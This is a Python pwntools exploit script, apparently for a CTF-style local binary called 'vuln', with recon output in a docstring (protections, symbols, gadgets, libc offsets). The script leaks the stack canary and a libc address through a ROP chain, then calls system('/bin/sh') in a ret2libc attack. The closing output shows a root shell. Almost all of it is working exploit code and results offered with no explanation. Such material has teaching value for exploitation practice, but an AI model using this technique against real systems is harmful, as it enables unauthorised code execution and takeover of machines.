#!/usr/bin/env python

"""
file ./vuln
  ./vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19913e1bed4d738d5ede4a3389cd51cd9b0b5553, for GNU/Linux 3.2.0, not stripped

Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : No

b *0x000000000040121e

Non-debugging symbols:
	0x0000000000401000  _init
	0x0000000000401030  puts@plt
	0x0000000000401040  __stack_chk_fail@plt
	0x0000000000401050  setbuf@plt
	0x0000000000401060  printf@plt
	0x0000000000401070  read@plt
	0x0000000000401080  _start
	0x00000000004010b0  _dl_relocate_static_pie
	0x00000000004010c0  deregister_tm_clones
	0x00000000004010f0  register_tm_clones
	0x0000000000401130  __do_global_dtors_aux
	0x0000000000401160  frame_dummy
	0x0000000000401162  begin
	0x00000000004011cc  FaiCose
	0x0000000000401234  main
	0x0000000000401290  __libc_csu_init
	0x00000000004012f0  __libc_csu_fini
	0x00000000004012f4  _fini

ldd vuln
	linux-vdso.so.1 (0x00007ffd03b5f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f68e4f80000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f68e5161000)

objdump -M intel -d vuln|  grep puts
  0000000000401030 <puts@plt>:
    401030:	ff 25 72 23 00 00    	jmp    QWORD PTR [rip+0x2372]        # 4033a8 <puts@GLIBC_2.2.5>
    40125c:	e8 cf fd ff ff       	call   401030 <puts@plt>
ROPgadget --binary vuln | grep 'pop rdi ; ret'
	0x00000000004012eb : pop rdi ; ret

readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
   501: 00000000000fee10  1241 FUNC    GLOBAL DEFAULT   14 putspent@@GLIBC_2.2.5
   685: 0000000000100910   697 FUNC    GLOBAL DEFAULT   14 putsgent@@GLIBC_2.10
  1154: 0000000000072af0   338 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
  1698: 0000000000072af0   338 FUNC    GLOBAL DEFAULT   14 _IO_fputs@@GLIBC_2.2.5
  2336: 000000000007cd00   151 FUNC    WEAK   DEFAULT   14 fputs_unlocked@@GLIBC_2.2.5

strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 183cee /bin/sh

readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
   235: 0000000000129b50    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
   613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5


"""

from pwn import *



def leak_cookie(p, junk):
	p.recv()
	p.sendline(junk)
	p.recvuntil(junk)
	leaked_cookie = u64(p.recv(8))
	cookie = leaked_cookie - 0x0a
	log.success("cookie: {}".format(hex(cookie)))
	cookie = p64(cookie)
	return cookie

main = p64(0x401234)
puts_plt = p64(0x401030)
puts_got = p64(0x4033a8)
rdi_gadget = p64(0x4012eb) # pop rdi ; ret
libc_puts = 0x74040

system_libc = 0x46ff0
shell_str_libc = 0x183cee # /bin/sh

junk = "A" * 104

p = process("./vuln")

# first stage: cookie leakage
cookie = leak_cookie(p, junk)

p.recv()

# second stage: puts@got leakage
payload = junk + cookie + p64(0x42424242424242) + rdi_gadget + puts_got + puts_plt + main

p.sendline(payload)
p.recvuntil(junk)
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base_address = leaked_puts - libc_puts
shell = p64(libc_base_address + shell_str_libc)
system = p64(libc_base_address + system_libc)


log.success("puts@GLIBC_2 leaked: {}".format(hex(leaked_puts)))
log.success("libc_base_address: {}".format(hex(libc_base_address)))
log.success("system(): {}".format(hex(u64(system))))
log.success("shell string: {}".format(hex(u64(shell))))

# third stage: getting shell

payload = junk + cookie + p64(0x42424242424242) + rdi_gadget + shell + system
p.sendline(junk)
p.recvuntil(junk)
p.clean()
p.sendline(payload)
p.clean()
p.interactive()

"""
[+] Starting local process './vuln': pid 14476
[+] cookie: 0x80f6c915f596500
[+] puts@GLIBC_2 leaked: 0x7ff7181c5040
[+] libc_base_address: 0x7ff718151000
[+] system(): 0x7ff718197ff0
[+] shell string: 0x7ff7182d4cee
[*] Switching to interactive mode
$ whoami
root
$
"""

